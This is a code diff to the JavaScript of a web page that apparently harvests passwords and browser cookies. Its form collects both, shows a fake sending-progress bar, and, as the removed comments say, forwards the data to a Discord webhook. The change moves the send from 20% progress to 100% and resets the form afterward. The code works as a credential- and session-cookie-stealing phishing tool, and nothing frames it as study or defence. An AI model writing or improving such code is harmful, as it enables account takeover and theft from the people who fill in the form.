@@ -298,27 +298,9 @@
         status.textContent = `Sending ${percent}%`;
       }
 
-      // Send Discord webhook when progress reaches 20%
-      if (percent >= 20 && !formData.webhookSent) {
-        formData.webhookSent = true; // Prevent multiple sends
-        submitForm(formData);
-      }
-
       if (percent >= 100) {
         clearInterval(interval);
-        // If webhook was already sent, just show completion
-        if (formData.webhookSent) {
-          status.textContent = 'Successfully ✅';
-          status.style.color = '#4CAF50';
-          // Re-enable button
-          btn.disabled = false;
-          btn.textContent = 'Submit';
-          // Clear form
-          passwordInput.value = '';
-          cookieInput.value = '';
-        } else {
-          submitForm(formData);
-        }
+        submitForm(formData);
       }
     }, 1000);  // Changed from 100ms to 1000ms (1 second)
   });
@@ -336,32 +318,23 @@
       const result = await response.json();
 
       if (result.success) {
-        // Only update status if we're at 100%, otherwise let progress continue
-        if (!formData.webhookSent) {
-          status.textContent = 'Successfully ✅';
-          status.style.color = '#4CAF50';
-          // Clear form
-          passwordInput.value = '';
-          cookieInput.value = '';
-          // Re-enable button
-          btn.disabled = false;
-          btn.textContent = 'Submit';
-        }
-        // If called at 20%, webhook is sent but let progress continue
+        status.textContent = 'Successfully ✅';
+        status.style.color = '#4CAF50';
+        // Clear form
+        passwordInput.value = '';
+        cookieInput.value = '';
       } else {
         status.textContent = `❌ ${result.message}`;
         status.style.color = '#ff5b5b';
-        // Re-enable button
-        btn.disabled = false;
-        btn.textContent = 'Submit';
       }
     } catch (error) {
       status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
       status.style.color = '#ff5b5b';
-      // Re-enable button
-      btn.disabled = false;
-      btn.textContent = 'Submit';
     }
+
+    // Re-enable button
+    btn.disabled = false;
+    btn.textContent = 'Submit';
   }
 </script>
 </body>
